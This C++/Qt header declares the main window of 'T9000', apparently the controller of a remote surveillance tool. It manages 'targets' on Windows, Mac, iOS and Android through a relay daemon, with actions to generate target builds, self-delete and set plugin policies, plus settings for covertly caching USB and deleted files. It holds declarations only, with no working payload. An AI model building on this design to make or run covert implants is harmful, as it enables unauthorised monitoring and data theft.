/*!
	Description : T9000 主界面
	Author		: Ruining Song
	Date		: 2013.11.6
	Remark		:
*/


#ifndef MAINDLG_H
#define MAINDLG_H

#include <QtGui>
#include <QSystemTrayIcon>
#include <string>
#include "ControlConnection.h"
#include "TargetConnection.h"
#include "processdatathread.h"
#include "ui_maindlg.h"
#include "conndlg.h"
#include "IpFinder.h"

//
// 控制端的消息
//
#define WM_CONTROL_CONNCOMPLETED        (WM_APP + 100)      // 控制连接建立
#define WM_CONTROL_CONNFAILED           (WM_APP + 101)      // 控制连接失败
#define WM_CONTROL_CONNCLOSED           (WM_APP + 102)      // 控制连接关闭
#define WM_CONTROL_ONLINE               (WM_APP + 103)      // 控制端在线
#define WM_CONTROL_PASSFAILED           (WM_APP + 104)      // 密码错误
#define WM_CONTROL_INOTHERPLACE         (WM_APP + 105)      // 另一个相同的用户在其它地方登录了
#define WM_CONTROL_SOLECONNMULTIDAEMON  (WM_APP + 106)      // 单用户控制端连接到多用户中转服务器上
#define WM_CONTROL_MULTICONNSOLEDAEMON  (WM_APP + 107)      // 多用户控制端连接到单用户中转服务器上
#define WM_CONTROL_MULTIUNSIGNED        (WM_APP + 108)      // 多用户控制端没有经过认定
#define WM_CONTROL_DATAPORTINCORRECT    (WM_APP + 109)      // 控制端和中转服务器的数据端口不一致

//
// 目标消息
//
#define WM_NEW_TARGET                   (WM_APP + 110)      // 新目标
#define WM_ERASE_TARGET                 (WM_APP + 111)      // 目标清除
#define WM_TARGET_FOUND                 (WM_APP + 112)      // 发现目标
#define WM_TARGET_STATUS_CHANGE         (WM_APP + 113)      // 目标状态改变
#define WM_TARGET_INFO_UPDATED          (WM_APP + 114)      // 目标信息更新
#define WM_TARGET_EXINFO_UPDATED        (WM_APP + 115)      // 目标扩展信息更新
#define WM_TARGET_SWITCH                (WM_APP + 116)      // 目标切换
#define WM_TARGET_DATACONNCLOSED        (WM_APP + 117)      // 目标数据连接关闭

//
// 基础消息
//
#define WM_SET_STATUSINFO_A             (WM_APP + 200)
#define WM_SET_STATUSINFO_W             (WM_APP + 201)

#define WM_ADD_TARGET_DIALOG			(WM_APP + 202)		// 添加 Target Dialog


#define WM_QUERY_DAEMONADDR_FINISHED    (WM_APP + 800)
#define WM_QUERY_DAEMONADDR2_FINISHED   (WM_APP + 801)

typedef int (WINAPI *ZlibUncompress)(BYTE *dest, ULONG *destLen, const BYTE *source, ULONG sourceLen);

class DlgContainer;
class QTimer;
class WaitDlg;
class QueryDaemonAddressDlg;

namespace Category
{
	enum CategoryType{GROUP, PLATFORM, IP};
}

namespace DisplayMode
{
	enum DisplayModeType{SHOW_ALL, SHOW_ONLINE, SHOW_OFFLINE, SHOW_FAVORITE};
}

class MainDlg : public QMainWindow
{
	Q_OBJECT

public:
	MainDlg(QWidget *parent = 0, Qt::WFlags flags = 0);
	~MainDlg();

	//
	// process data thread 相关
	//
	PDATA_BLOCK PopPlgDataBlock();

	void PushPlgDataBlock(PDATA_BLOCK dataBlock);

protected:

	// 关闭窗口事件
	void closeEvent(QCloseEvent *event);

	// windows 消息接管
	bool winEvent(MSG *message, long *result);

public slots:

	//
	// 分别对应工具栏和菜单上的一系列命令
	//

	// 开始
	void StartAction();

	// 停止
	void StopAction();

	// 迁移中转
	void MigrateDaemonAction();

	// 退出
	void ExitAction();

	// 全局策略
	void ConfigAction();

	// 设置插件策略
	void PolicyAction();

	// 设置目标别名
	void AliasAction();

	// 收藏
	void FavoriteAction();

	// 自删除
	void DelSelfAction();

	// 流量控制
	void FlowControlAction();

	// 清除目标数据
	void CleanAction();

	// 生成目标端
	void CreateTargetAction();
	
	// 生成中转
	void CreateDaemonAction();

	// 清空数据库
	void CleanDatabaseAction();

	// 查询中转回连信息
	void QueryDaemonAddressAction();

	// 使用指南
	void HelpAction();

	// 关于
	void AboutAction();

	//////////////////////////////////

	// 双击列表中的目标
	void ShowTarget(QTreeWidgetItem* item, int column);

	// 单击列表中的目标
	void CurrentTargetChanged(QTreeWidgetItem* item, int column);

	// 列表右键菜单
	void onTrTargetContextMenuActived(QPoint point);

	// 分组方式改变
	void onCmbCateGoryCurrentIndexChanged(int index);

	// 显示方式改变
	void onCmbDisplayModeCurrentIndexChanged(int index);

	//////////////////////////////////

	// 心跳响应函数
	void PNGTimerTimer();

	// 任务栏闪烁
	void FlashTrayIcon();

	// 任务栏响应
	void ProcessTrayEvent(QSystemTrayIcon::ActivationReason reason);

public slots:
	
	void ActiveMainWindow();

	void ModifyPluginPolicy(unsigned int pTarget, int pluginNumber);

private:

	//
	// 分别对应接收到的每一个窗口消息
	//

	// 添加日志消息
	void on_WM_SET_STATUSINFO_A(MSG* msg);

	// 添加日志消息
	void on_WM_SET_STATUSINFO_W(MSG* msg);

	// 连接完成
	void on_WM_CONTROL_CONNCOMPLETED(MSG* msg);

	// 连接失败
	void on_WM_CONTROL_CONNFAILED(MSG* msg);

	// 连接关闭
	void on_WM_CONTROL_CONNCLOSED(MSG* msg);

	// 在线
	void on_WM_CONTROL_ONLINE(MSG* msg);

	// 密码错误
	void on_WM_CONTROL_PASSFAILED(MSG* msg);

	// 其他用户登录
	void on_WM_CONTROL_INOTHERPLACE(MSG* msg);  

	//void on_WM_CONTROL_SOLECONNMULTIDAEMON(MSG* msg);  
	//void on_WM_CONTROL_MULTICONNSOLEDAEMON(MSG* msg);  
	//void on_WM_CONTROL_MULTIUNSIGNED(MSG* msg);        
	//void on_WM_CONTROL_DATAPORTINCORRECT(MSG* msg);

	// 新目标
	void on_WM_NEW_TARGET(MSG* msg);

	// 目标清除
	void on_WM_ERASE_TARGET(MSG* msg);

	// 发现目标
	void on_WM_TARGET_FOUND(MSG* msg);

	// 目标状态改变
	void on_WM_TARGET_STATUS_CHANGE(MSG* msg);

	// 目标信息更新
	void on_WM_TARGET_INFO_UPDATED(MSG* msg);

	// 目标扩展信息更新
	void on_WM_TARGET_EXINFO_UPDATED(MSG* msg);

	// 目标切换
	void on_WM_TARGET_SWITCH(MSG* msg);

	// 目标数据连接关闭
	void on_WM_TARGET_DATACONNCLOSED(MSG* msg);

	// 添加 target dialog
	void on_WM_ADD_TARGET_DIALOG(MSG* msg);

private:

	////////////////////////////////////

	// 界面外观微调
	void InitWidgetAppearance();

	// 连接 signal & slot
	void InitConnection();

	// 改变在线状态
	void ChangeTargetStatus(QTreeWidgetItem* item, Target* target, bool online);

	// 输出日志至文件
	void WriteLogToFile(LPCWSTR wzLogInfo);

	// 初始化数据库
	void InitDatabase();

	////////////////////////////////////

	// 从 update.dat 中读取插件信息
	bool ReadPluginInfo(PPLUGIN_CXT PlgCxtVect[]);

	// 读配置文件
	bool ReadIniFile();

	// 写配置文件
	void WriteIniFile();

	// 连接至中转
	void ConnectToDaemon();

	// 从数据库中加载目标列表
	void InitialTargetData();

	// 下线
	void ControlOffline();

	// 添加目标节点
	void AddTargetNode(Target* tar);

	// 在日志窗口中添加消息
	void AddStatusInfo(STATUS_LEVEL sl, const wchar_t* lpwzInfo);

	void AddStatusInfo(STATUS_LEVEL sl, const char* lpszInfo);

	// 根据分组类型添加节点
	void AddTargetNode(QTreeWidgetItem* item);

	// 按编号添加
	void AddItemByGroup(QTreeWidgetItem* item);

	// 按平台添加
	void AddItemByPlatform(QTreeWidgetItem* item);

	// 按 IP 添加
	void AddItemByIP(QTreeWidgetItem* item);

	// 统计目标数量
	void UpateTargetCount();

	// item 在当前显示模式下是否可以显示
	bool ItemCanShow(QTreeWidgetItem* item);

	// 刷新目标列表
	void RefreshTargetList();

	// 获取目标目录信息
	void AutoGetDirInfo(Target* tarBlock);

	// 更新节点的显示状态
	void UpdateTargetDisplay(QTreeWidgetItem* item);

	//////////////////////////////////

private:
	Ui::MainDlgClass ui;
	QList<QWidget*> m_targetWindowList;		// 用于存储子窗口
	ConnDlg	m_connDlg;						// 对话框 - 连接设置
	QTimer	m_PNGTimer;						// 用于保持响应
	QThread* dbThread;						// 数据库处理线程

public:

	// 窗口句柄
	HWND Handle;

	TargetConnection  *ctrConn;
	bool                ctrOnlineFlag;

	// 多控制端使用
	//
	DWORD               dwCtrUserId;        // 控制端ID
	DWORD               dwStartFlagId;
	DWORD               dwStopFlagId;

	// 基本配置信息
	//
	std::string          aniDaemonIpAddr;
	int                 nPortForTarget;
	int                 nCtrPortForControl;
	int                 nDataPortForControl;

	BYTE                byPassMd5[16];
	bool                bAutoLogin;
	std::string          aniDbFile;
	std::string          aniLocalTarFileDir;

	// 主应用插件配置数据
	//
	BOOL                bUsbSecurityMode;
	BOOL                bCacheUsbDir;
	BOOL                bCacheUsbFile;
	DWORD               dwUsbMaxFileSize;    
	std::wstring          widUsbExt;
	BOOL                bCacheFileDel;
	DWORD               dwDelMaxFileSize;
	std::wstring          widFileDelExt;

	// Plugin Info
	//
	PPLUGIN_CXT         MacPlgCxtVect[MAX_PLG_COUNT];
	PPLUGIN_CXT         IosPlgCxtVect[MAX_PLG_COUNT];
	PPLUGIN_CXT         WindowsPlgCxtVect[MAX_PLG_COUNT];
	PPLUGIN_CXT         AndroidPlgCxtVect[MAX_PLG_COUNT];
	ULONG               plgCount;

	// 处理插件数据
	//
	bool                bClosing;

	ProcessDataThread   *procDataThread;            // @@@ 当前仅仅使用单线程进行处理
	HANDLE              hEventForPlgData;
	PDATA_BLOCK         dataBlockHeader;
	ULONG               dataBlockCount;
	CRITICAL_SECTION    csPlgDataBlock;

	DlgContainer* m_targetDlgContainer;

	IpFinder m_ipfinder;

	std::list<QTreeWidgetItem*> m_itemList;

	// 分组类型
	int m_category;

	// 显示类型
	int m_displayMode;

	QSystemTrayIcon* m_tray;

	QTimer* m_trayFlashTimer;
	bool m_iconToggle;

	WaitDlg* m_waitDlg;

	QueryDaemonAddressDlg* m_qdaDlg;
};

extern MainDlg* FrmMain;

#endif // MAINDLG_H